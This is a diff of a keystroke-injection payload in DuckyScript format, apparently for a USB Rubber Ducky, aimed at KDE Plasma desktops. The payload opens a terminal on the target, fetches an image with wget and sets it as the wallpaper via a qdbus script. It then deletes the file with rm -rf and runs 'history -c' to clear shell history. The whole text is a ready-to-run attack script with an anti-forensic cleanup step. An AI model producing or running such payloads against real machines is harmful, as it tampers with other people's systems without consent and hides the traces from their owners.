@@ -11,29 +11,22 @@ REM ###########################################
 REM Requirements:
 REM     - Internet Connection
 
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
-
 REM Replace 'example.com/IMAGE_NAME' with your image link
 DEFINE IMAGE_LINK example.com/IMAGE_NAME
-STRING wget 
-STRING IMAGE_LINK
-ENTER
 
 REM Replace example.jpg with the image path, for example /home/USERNAME/example.jpg
 DEFINE IMAGE_PATH="file://example.jpg"
 
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+
+STRINGLN wget IMAGE_LINK
+
 REM It depends by the Internet Connection
 DELAY 2000
 
-STRING qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript 'var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {d = allDesktops[i]; d.wallpaperPlugin = "org.kde.image";d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");d.writeConfig("Image", "
-STRING IMAGE_PATH
-STRING ")}'
-ENTER
+STRINGLN qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript 'var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {d = allDesktops[i]; d.wallpaperPlugin = "org.kde.image";d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");d.writeConfig("Image", "IMAGE_PATH")}'
 DELAY 1000
 
-STRING rm -rf 
-STRING IMAGE_PATH
-STRING ;history -c; exit;
-ENTER
+STRINGLN rm -rf IMAGE_PATH;history -c; exit;
